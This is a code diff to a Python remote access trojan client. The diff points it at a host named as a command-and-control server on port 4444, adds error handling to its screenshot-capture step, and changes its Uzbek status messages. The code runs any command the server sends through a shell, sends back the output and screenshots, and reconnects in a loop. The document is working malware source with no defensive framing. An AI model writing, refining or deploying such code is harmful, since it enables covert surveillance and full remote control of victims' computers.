@@ -5,7 +5,7 @@ import os
 import platform
 from PIL import ImageGrab
 
-SERVER_HOST = 'mosy.onrender.com'
+SERVER_HOST = 'mosy-c2-server.onrender.com'
 SERVER_PORT = 4444
 
 def connect():
@@ -37,14 +37,17 @@ def connect():
                     break
                 
                 if command == 'screenshot':
-                    screenshot_path = 'screen.png'
-                    img = ImageGrab.grab()
-                    img.save(screenshot_path)
-                    
-                    with open(screenshot_path, 'rb') as f:
-                        data = f.read()
-                    s.sendall(len(data).to_bytes(4, 'big') + data)
-                    os.remove(screenshot_path)
+                    try:
+                        screenshot_path = 'screen.png'
+                        img = ImageGrab.grab()
+                        img.save(screenshot_path)
+                        with open(screenshot_path, 'rb') as f:
+                            data = f.read()
+                        s.sendall(len(data).to_bytes(4, 'big') + data)
+                        os.remove(screenshot_path)
+                    except Exception as e:
+                        err = str(e).encode('utf-8')
+                        s.sendall(len(err).to_bytes(4, 'big') + err)
                 else:
                     try:
                         output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
@@ -52,7 +55,7 @@ def connect():
                         output = str(e)
                     
                     if not output:
-                        output = "Bajarildi."
+                        output = "Buyruq bajarildi (natija yo'q)."
                     out_bytes = output.encode('utf-8')
                     s.sendall(len(out_bytes).to_bytes(4, 'big') + out_bytes)
                     
@@ -60,7 +63,7 @@ def connect():
         except:
             pass
         
-        time.sleep(3)
+        time.sleep(5)
 
 if __name__ == '__main__':
     connect()
